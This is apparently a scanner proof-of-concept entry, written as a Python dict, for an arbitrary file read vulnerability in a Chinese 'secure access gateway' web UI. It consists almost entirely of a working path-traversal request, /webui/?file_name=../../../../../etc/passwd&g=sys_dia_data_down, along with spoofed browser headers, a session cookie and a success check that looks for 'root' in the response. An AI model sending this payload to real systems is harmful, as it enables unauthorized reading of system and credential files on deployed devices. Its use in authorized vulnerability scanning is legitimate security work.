{
        'name': '安全接入网关 jquery 1.7.2 任意文件读取漏洞',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '/webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Cookie': 'USGSESSID=b75bce9897c9e54 3ab7be9ac44af4f76',
                'Upgrade-Insecure-Requests': '1'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'root'
        }}]
    }